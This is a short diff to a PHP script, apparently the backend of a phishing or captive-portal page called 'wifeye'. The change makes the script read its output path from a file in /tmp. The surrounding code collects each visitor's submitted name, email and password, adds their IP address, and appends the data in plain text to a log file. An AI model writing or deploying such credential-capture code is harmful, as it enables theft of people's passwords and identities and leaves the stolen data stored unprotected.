@@ -14,11 +14,11 @@
         }  
         return $ip;  
     }
-
-    $myfile = fopen("mydata.txt", "a+");
+    $path = file_get_contents('/tmp/wifeyePath.txt');
+    $myfile = fopen($path, "a+");
     $ip = getIPAddress();  
     $data = $_POST['name'] . ' ' . $_POST['email'] . ' ' . $_POST['password'] . ' ' . $ip . "\r\n";
-    $test = file_get_contents('mydata.txt');
+    $test = file_get_contents($path);
     if(!(strpos($test,$data) !== false)){
         $ret = fwrite($myfile,$data . "\r\n");
         if($ret === false) {
